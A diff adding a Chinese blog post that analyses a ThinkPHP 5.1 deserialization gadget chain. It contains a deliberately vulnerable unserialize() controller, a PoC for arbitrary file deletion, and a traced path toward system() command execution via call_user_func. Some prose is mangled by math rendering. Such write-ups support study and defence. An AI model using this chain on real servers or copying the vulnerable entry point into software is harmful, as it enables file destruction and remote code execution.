@@ -1,0 +1,645 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>重生之学习thinkphp5.1.x反序列化 | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="重生之学习thinkphp5.1.x反序列化 | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+昨天分析完tp5.0的，今天继续5.1的，特地去学了一下phar反序列化，康复训练，tp5.1不提供下载，可以通过composer进行安装
+安装compoer
+https://install.phpcomposer.com/compo..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              重生之学习thinkphp5.1.x反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                14 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220528201509223.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>昨天分析完tp5.0的，今天继续5.1的，特地去学了一下phar反序列化，康复训练，tp5.1不提供下载，可以通过composer进行安装</p>
+<p>安装compoer</p>
+<pre><code>https://install.phpcomposer.com/composer.phar
+</code></pre>
+<p>放在php目录下，在 PHP 安装目录下新建一个 composer.bat 文件，并将下列代码保存到此文件中</p>
+<pre><code>@php &quot;%~dp0composer.phar&quot; %*
+</code></pre>
+<p>进入web根目录进行安装</p>
+<p>composer create-project topthink/think=5.1.35 tp5.1</p>
+<h1 id="调用链分析">调用链分析</h1>
+<p>反序列化，先在控制器里写个入口</p>
+<pre><code class="language-php">&lt;?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        return '&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;';
+    }
+
+    public function hello($name = 'ThinkPHP5')
+    {
+        return 'hello,' . $name;
+    }
+    public function unser()
+    {
+        echo $_POST['data'];
+        unserialize($_POST['data']);
+    }
+}
+</code></pre>
+<p>其实前面的调用链和thinkphp5.0.x的是一样的，都是位于<code>thinkphp/library/think/process/pipes/Windows.php</code>的destruct方法，然后调用到removeFiles方法</p>
+<pre><code class="language-php">private function removeFiles()
+{
+    foreach ($this-&gt;files as $filename) {
+        if (file_exists($filename)) {
+            @unlink($filename);
+        }
+    }
+    $this-&gt;files = [];
+}
+</code></pre>
+<p>这里其实就是存在任意文件删除的，传个filename进来就好了</p>
+<p>poc.php</p>
+<pre><code class="language-php">&lt;?php
+
+namespace think\process\pipes;
+class Windows
+{
+    private $files =[&quot;D:\\phpstudy_pro\\WWW\\tp5.1\\1.txt&quot;];;
+}
+echo urlencode(serialize(new Windows()));
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220528153550928.png" alt="image-20220528153550928" loading="lazy"></figure>
+<p>继续接着看反序列化，他接下来是通过file_exists去触发toString方法，这里用到的是<code>thinkphp/library/think/model/concern/Conversion.php</code>的toString方法，一直跟进，最后是调用到toArray方法。</p>
+<pre><code class="language-php">public function toArray()
+    {
+        $item       = [];
+        $hasVisible = false;
+
+        foreach ($this-&gt;visible as $key =&gt; $val) {
+            if (is_string($val)) {
+                if (strpos($val, '.')) {
+                    list($relation, $name)      = explode('.', $val);
+                    $this-&gt;visible[$relation][] = $name;
+                } else {
+                    $this-&gt;visible[$val] = true;
+                    $hasVisible          = true;
+                }
+                unset($this-&gt;visible[$key]);
+            }
+        }
+
+        foreach ($this-&gt;hidden as $key =&gt; $val) {
+            if (is_string($val)) {
+                if (strpos($val, '.')) {
+                    list($relation, $name)     = explode('.', $val);
+                    $this-&gt;hidden[$relation][] = $name;
+                } else {
+                    $this-&gt;hidden[$val] = true;
+                }
+                unset($this-&gt;hidden[$key]);
+            }
+        }
+
+        // 合并关联数据
+        $data = array_merge($this-&gt;data, $this-&gt;relation);
+
+        foreach ($data as $key =&gt; $val) {
+            if ($val instanceof Model || $val instanceof ModelCollection) {
+                // 关联模型对象
+                if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) {
+                    $val-&gt;visible($this-&gt;visible[$key]);
+                } elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) {
+                    $val-&gt;hidden($this-&gt;hidden[$key]);
+                }
+                // 关联模型对象
+                if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) {
+                    $item[$key] = $val-&gt;toArray();
+                }
+            } elseif (isset($this-&gt;visible[$key])) {
+                $item[$key] = $this-&gt;getAttr($key);
+            } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) {
+                $item[$key] = $this-&gt;getAttr($key);
+            }
+        }
+
+        // 追加属性（必须定义获取器）
+        if (!empty($this-&gt;append)) {
+            foreach ($this-&gt;append as $key =&gt; $name) {
+                if (is_array($name)) {
+                    // 追加关联对象属性
+                    $relation = $this-&gt;getRelation($key);
+
+                    if (!$relation) {
+                        $relation = $this-&gt;getAttr($key);
+                        if ($relation) {
+                            $relation-&gt;visible($name);
+                        }
+                    }
+
+                    $item[$key] = $relation ? $relation-&gt;append($name)-&gt;toArray() : [];
+                } elseif (strpos($name, '.')) {
+                    list($key, $attr) = explode('.', $name);
+                    // 追加关联对象属性
+                    $relation = $this-&gt;getRelation($key);
+
+                    if (!$relation) {
+                        $relation = $this-&gt;getAttr($key);
+                        if ($relation) {
+                            $relation-&gt;visible([$attr]);
+                        }
+                    }
+
+                    $item[$key] = $relation ? $relation-&gt;append([$attr])-&gt;toArray() : [];
+                } else {
+                    $item[$name] = $this-&gt;getAttr($name, $item);
+                }
+            }
+        }
+
+        return $item;
+    }
+</code></pre>
+<p>这里的toArray方法比较长，但是我们最终的目的其实是要走到<code>$relation-&gt;visible($name);</code>处，目的就是要用来触发call方法，因为call方法避免出现找不到调用的方法而产生错误，在call方法中常利用call_user_func_array来调用，在这里这个$relation可控，所以就选择他。首先如果需要执行到这里，必须满足几个条件</p>
+<ul>
+<li>!empty($this-&gt;append)</li>
+<li>is_array($name)</li>
+<li>在<code>$relation = $this-&gt;getRelation($key);</code>没有获取到$relation</li>
+<li>在<code>$relation = $this-&gt;getAttr($key);</code>获取到relation</li>
+</ul>
+<p>第一个条件很容易满足，直接看getRelation方法</p>
+<pre><code class="language-php">public function getRelation($name = null)
+{
+    if (is_null($name)) {
+        return $this-&gt;relation;
+    } elseif (array_key_exists($name, $this-&gt;relation)) {
+        return $this-&gt;relation[$name];
+    }
+    return;
+}
+</code></pre>
+<p>我们这里需要让他返回的是空，又传入了<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">去</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">只</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">保</mi><mi mathvariant="normal">证</mi></mrow><annotation encoding="application/x-tex">key进去，只需要保证</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">去</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">保</span><span class="mord cjk_fallback">证</span></span></span></span>key不在他的relation数组里即可。继续跟进getAttr</p>
+<pre><code class="language-php">public function getAttr($name, &amp;$item = null)
+{
+    try {
+        $notFound = false;
+        $value    = $this-&gt;getData($name);
+    } catch (InvalidArgumentException $e) {
+        $notFound = true;
+        $value    = null;
+    }
+
+    // 检测属性获取器
+    $fieldName = Loader::parseName($name);
+    $method    = 'get' . Loader::parseName($name, 1) . 'Attr';
+
+    if (isset($this-&gt;withAttr[$fieldName])) {
+        if ($notFound &amp;&amp; $relation = $this-&gt;isRelationAttr($name)) {
+            $modelRelation = $this-&gt;$relation();
+            $value         = $this-&gt;getRelationData($modelRelation);
+        }
+
+        $closure = $this-&gt;withAttr[$fieldName];
+        $value   = $closure($value, $this-&gt;data);
+    } elseif (method_exists($this, $method)) {
+        if ($notFound &amp;&amp; $relation = $this-&gt;isRelationAttr($name)) {
+            $modelRelation = $this-&gt;$relation();
+            $value         = $this-&gt;getRelationData($modelRelation);
+        }
+
+        $value = $this-&gt;$method($value, $this-&gt;data);
+    } elseif (isset($this-&gt;type[$name])) {
+        // 类型转换
+        $value = $this-&gt;readTransform($value, $this-&gt;type[$name]);
+    } elseif ($this-&gt;autoWriteTimestamp &amp;&amp; in_array($name, [$this-&gt;createTime, $this-&gt;updateTime])) {
+        if (is_string($this-&gt;autoWriteTimestamp) &amp;&amp; in_array(strtolower($this-&gt;autoWriteTimestamp), [
+            'datetime',
+            'date',
+            'timestamp',
+        ])) {
+            $value = $this-&gt;formatDateTime($this-&gt;dateFormat, $value);
+        } else {
+            $value = $this-&gt;formatDateTime($this-&gt;dateFormat, $value, true);
+        }
+    } elseif ($notFound) {
+        $value = $this-&gt;getRelationAttribute($name, $item);
+    }
+
+    return $value;
+}
+</code></pre>
+<p>最后返回的是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">在</mi><mi>t</mi><mi>r</mi><mi>y</mi><mi mathvariant="normal">/</mi><mi>c</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">语</mi><mi mathvariant="normal">句</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">value，在try/catch语句中通过`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">在</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">/</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord cjk_fallback">语</span><span class="mord cjk_fallback">句</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord">‘</span></span></span></span>value= <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>g</mi><mi>e</mi><mi>t</mi><mi>D</mi><mi>a</mi><mi>t</mi><mi>a</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">this-&gt;getData(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen">(</span></span></span></span>name);`赋值，跟进getData方法</p>
+<pre><code class="language-php">public function getData($name = null)
+{
+    if (is_null($name)) {
+        return $this-&gt;data;
+    } elseif (array_key_exists($name, $this-&gt;data)) {
+        return $this-&gt;data[$name];
+    } elseif (array_key_exists($name, $this-&gt;relation)) {
+        return $this-&gt;relation[$name];
+    }
+    throw new InvalidArgumentException('property not exists:' . static::class . '-&gt;' . $name);
+}
+</code></pre>
+<p>这里传进来的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">之</mi><mi mathvariant="normal">前</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">name就是之前的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">的</span></span></span></span>key，他会判断是否在他的data数组和relation数组中。现在先来总结一下之前的</p>
+<ul>
+<li>$this-&gt;append 可控并且不能是空</li>
+<li>$this-&gt;data 可控</li>
+<li>key是this-&gt;append的键名</li>
+<li>key不是this-&gt;relation的键名</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">relation=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>this-&gt;data[$key]</li>
+</ul>
+<p><strong>当我们</strong> <code>$relation</code><strong>为一个对象时，就可以进行调用类中的</strong> <code>visible</code><strong>方法且传参可控，但是需要注意</strong></p>
+<pre><code>_toString()    trait Conversion类
+ toArray()       trait Conversion类
+ getRelation()   trait Attribute类
+ getAttr()       trait Attribute类
+</code></pre>
+<blockquote>
+<p><strong>自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。</strong></p>
+</blockquote>
+<p>所以我们需要找到一个同时继承了<strong>Attribute类和Conversion类</strong>的对象，找到了<code>thinkphp/library/think/Model.php</code>,但是他是个抽象类，需要找到他的子类Pivot。</p>
+<p>继续寻找，我们现在的目标是寻找一个有call方法但是木有visible方法的类，因为一般的call方法会避免找不到调用的方法出错，会使用call_user_func和call_user_func_array。</p>
+<p>这里找到的是<code>thinkphp/library/think/Request.php</code></p>
+<pre><code class="language-php">public function __call($method, $args)
+{
+    if (array_key_exists($method, $this-&gt;hook)) {
+        array_unshift($args, $this);
+        return call_user_func_array($this-&gt;hook[$method], $args);
+    }
+
+    throw new Exception('method not exists:' . static::class . '-&gt;' . $method);
+}
+</code></pre>
+<p>需要让hook数组中有visible这个键。但是<code>args</code>经过了<code>array_unshift</code>函数插入导致<code>args数组</code>的第一个值不可控，但是我们可以调用任何方法。这里先来看<code>thinkphp/library/think/Request.php</code>的input方法</p>
+<pre><code class="language-php">public function input($data = [], $name = '', $default = null, $filter = '')
+{
+    if (false === $name) {
+        // 获取原始数据
+        return $data;
+    }
+
+    $name = (string) $name;
+    if ('' != $name) {
+        // 解析name
+        if (strpos($name, '/')) {
+            list($name, $type) = explode('/', $name);
+        }
+
+        $data = $this-&gt;getData($data, $name);
+
+        if (is_null($data)) {
+            return $default;
+        }
+
+        if (is_object($data)) {
+            return $data;
+        }
+    }
+
+    // 解析过滤器
+    $filter = $this-&gt;getFilter($filter, $default);
+
+    if (is_array($data)) {
+        array_walk_recursive($data, [$this, 'filterValue'], $filter);
+        if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) {
+            // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
+            $this-&gt;arrayReset($data);
+        }
+    } else {
+        $this-&gt;filterValue($data, $name, $filter);
+    }
+
+    if (isset($type) &amp;&amp; $data !== $default) {
+        // 强制类型转换
+        $this-&gt;typeCast($data, $type);
+    }
+
+    return $data;
+}
+</code></pre>
+<p>他对$data循环调用了filterValue方法。来看看filterValue方法里是怎么写的</p>
+<pre><code class="language-php">private function filterValue(&amp;$value, $key, $filters)
+{
+    $default = array_pop($filters);
+
+    foreach ($filters as $filter) {
+        if (is_callable($filter)) {
+            // 调用函数或者方法过滤
+            $value = call_user_func($filter, $value);
+        } elseif (is_scalar($value)) {
+            if (false !== strpos($filter, '/')) {
+                // 正则过滤
+                if (!preg_match($filter, $value)) {
+                    // 匹配不成功返回默认值
+                    $value = $default;
+                    break;
+                }
+            } elseif (!empty($filter)) {
+                // filter函数不存在时, 则使用filter_var进行过滤
+                // filter为非整形值时, 调用filter_id取得过滤id
+                $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
+                if (false === $value) {
+                    $value = $default;
+                    break;
+                }
+            }
+        }
+    }
+
+    return $value;
+}
+</code></pre>
+<p>他这里使用了call_user_func，把<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi mathvariant="normal">作</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">带</mi><mi mathvariant="normal">入</mi></mrow><annotation encoding="application/x-tex">value作为参数带入</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">带</span><span class="mord cjk_fallback">入</span></span></span></span>filter进行调用，但是这里的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi mathvariant="normal">并</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">他</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">源</mi><mi mathvariant="normal">于</mi><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mo>(</mo><mo>)</mo><mi mathvariant="normal">中</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">value并不可控，他是来源于input()中的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">他</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">源</span><span class="mord cjk_fallback">于</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">p</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mclose">)</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span></span></span></span>data的键，但是input中的$data依旧不可控，继续往上找，找到param方法。</p>
+<pre><code class="language-php">public function param($name = '', $default = null, $filter = '')
+{
+    if (!$this-&gt;mergeParam) {
+        $method = $this-&gt;method(true);
+
+        // 自动获取请求变量
+        switch ($method) {
+            case 'POST':
+                $vars = $this-&gt;post(false);
+                break;
+            case 'PUT':
+            case 'DELETE':
+            case 'PATCH':
+                $vars = $this-&gt;put(false);
+                break;
+            default:
+                $vars = [];
+        }
+
+        // 当前请求参数和URL地址中的参数合并
+        $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
+
+        $this-&gt;mergeParam = true;
+    }
+
+    if (true === $name) {
+        // 获取包含文件上传信息的数组
+        $file = $this-&gt;file();
+        $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;
+
+        return $this-&gt;input($data, '', $default, $filter);
+    }
+
+    return $this-&gt;input($this-&gt;param, $name, $default, $filter);
+}
+</code></pre>
+<p>他在最后调用了input方法，param是通过get方法传入的，$name并不可控，现在就差name了，再往上找一层，找到isAjax方法</p>
+<pre><code class="language-php">public function isAjax($ajax = false)
+{
+    $value  = $this-&gt;server('HTTP_X_REQUESTED_WITH');
+    $result = 'xmlhttprequest' == strtolower($value) ? true : false;
+
+    if (true === $ajax) {
+        return $result;
+    }
+
+    $result           = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result;
+    $this-&gt;mergeParam = false;
+    return $result;
+}
+</code></pre>
+<p>这里调用<code>$this-&gt;param($this-&gt;config['var_ajax'])</code>，把自身的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>f</mi><mi>i</mi><mi>g</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><mi>v</mi><mi>a</mi><msub><mi>r</mi><mi>a</mi></msub><mi>j</mi><mi>a</mi><msup><mi>x</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mi mathvariant="normal">作</mi><mi mathvariant="normal">为</mi><mi>p</mi><mi>a</mi><mi>r</mi><mi>a</mi><mi>m</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">法</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">config[&#x27;var_ajax&#x27;]作为param方法的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">的</span></span></span></span>name,然后作为input方法的name，并且param中的$data是get传入的参数，作为data一直到filterValue里的key和value。我们从最后开始再走一遍，最终是要调用到这个filterValue方法</p>
+<p>主要是<code>$value = call_user_func($filter, $value);</code>,所以我们要进行命令执行，filter就可以是system，value就是我们的命令，这里的filter是filters数组里的，value是在input传入的，继续往上走，在input中调用filterValue的代码如下<code>array_walk_recursive($data, [$this, 'filterValue'], $filter);</code>,此时是对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">调</mi><mi mathvariant="normal">用</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>V</mi><mi>a</mi><mi>l</mi><mi>u</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">data调用filterValue，此时的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">的</span></span></span></span>filter就应该是传到filterValue方法里的第三个参数就是filters，他是通过getFilter获取的</p>
+<pre><code class="language-php">protected function getFilter($filter, $default)
+{
+    if (is_null($filter)) {
+        $filter = [];
+    } else {
+        $filter = $filter ?: $this-&gt;filter;
+        if (is_string($filter) &amp;&amp; false === strpos($filter, '/')) {
+            $filter = explode(',', $filter);
+        } else {
+            $filter = (array) $filter;
+        }
+    }
+
+    $filter[] = $default;
+
+    return $filter;
+}
+</code></pre>
